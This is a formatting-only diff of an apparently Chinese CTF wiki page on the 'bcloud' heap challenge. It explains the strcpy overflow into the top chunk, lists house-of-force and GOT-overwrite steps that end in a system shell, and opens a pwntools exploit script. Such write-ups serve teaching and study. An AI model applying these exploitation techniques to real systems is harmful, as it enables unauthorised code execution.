@@ -237,7 +237,7 @@ bcloud:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bi
 <span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;OKay! Enjoy:)&quot;</span><span class=p>);</span>
 <span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>v5</span><span class=p>;</span>
 <span class=p>}</span>
-</code></pre></div> <p>當讀入組織時，給定 64 字節，會覆蓋 v2 的低地址。與此同時，我們可以知道 v2 是與 top chunk 相鄰的 chunk，而 v2 恰好與 org 相鄰，那麼由於在 32 位程序中，一般都是 32 位全部都使用，這裏 v2 所存儲的內容，幾乎很大程度上都不是 <code>\x00</code> ，所以當執行 strcpy 函數向 v2 中拷貝內容時，很有可能會覆蓋top chunk。這就是漏洞所在。</p> <h3 id=_9>利用<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <ol> <li>利用初始化名字處的漏洞泄漏堆的基地址。。</li> <li>利用 house of force 將 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 處，當再次申請內存時，便返回notesize地址處的內存，從而我們就可以控制所有note的大小以及對應的地址了。</li> <li>修改前三個 note 的大小爲16，並修改其指針爲 free@got，atoi@got，atoi@got</li> <li>將 free@got 修改爲 puts@plt。</li> <li>泄漏 atoi 地址。</li> <li>再次修改另外一個 atoi got 項爲 system 地址，從而拿到shell。</li> </ol> <p>具體腳本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>當讀入組織時，給定 64 字節，會覆蓋 v2 的低地址。與此同時，我們可以知道 v2 是與 top chunk 相鄰的 chunk，而 v2 恰好與 org 相鄰，那麼由於在 32 位程序中，一般都是 32 位全部都使用，這裏 v2 所存儲的內容，幾乎很大程度上都不是 <code>\x00</code> ，所以當執行 strcpy 函數向 v2 中拷貝內容時，很有可能會覆蓋top chunk。這就是漏洞所在。</p> <h3 id=_9>利用<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <ol> <li>利用初始化名字處的漏洞泄漏堆的基地址。。</li> <li>利用 house of force 將 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 處，當再次申請內存時，便返回notesize地址處的內存，從而我們就可以控制所有note的大小以及對應的地址了。</li> <li>修改前三個 note 的大小爲16，並修改其指針爲 free@got，atoi@got，atoi@got</li> <li>將 free@got 修改爲 puts@plt。</li> <li>泄漏 atoi 地址。</li> <li>再次修改另外一個 atoi got 項爲 system 地址，從而拿到shell。</li> </ol> <p>具體腳本如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;gnome-terminal&#39;</span><span class=p>,</span> <span class=s1>&#39;-x&#39;</span><span class=p>,</span> <span class=s1>&#39;sh&#39;</span><span class=p>,</span> <span class=s1>&#39;-c&#39;</span><span class=p>]</span>
 <span class=k>if</span> <span class=n>args</span><span class=p>[</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>]:</span>
     <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
@@ -251,7 +251,7 @@ bcloud:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bi
 <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>offset_bin_main_arena</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>offset_bin_main_arena</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>word_bytes</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>word_size</span> <span class=o>/</span> <span class=mi>8</span>
     <span class=n>offset</span> <span class=o>=</span> <span class=mi>4</span>  <span class=c1># lock</span>
     <span class=n>offset</span> <span class=o>+=</span> <span class=mi>4</span>  <span class=c1># flags</span>
@@ -262,7 +262,7 @@ bcloud:<span class=w> </span>ELF<span class=w> </span><span class=m>32</span>-bi
     <span class=k>return</span> <span class=n>offset</span>
 
 
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+<span class=k>def</span><span class=w> </span><span class=nf>exp</span><span class=p>():</span>
     <span class=c1># leak heap base</span>
     <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your name:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>64</span><span class=p>)</span>
     <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Hey &#39;</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>64</span><span class=p>)</span>
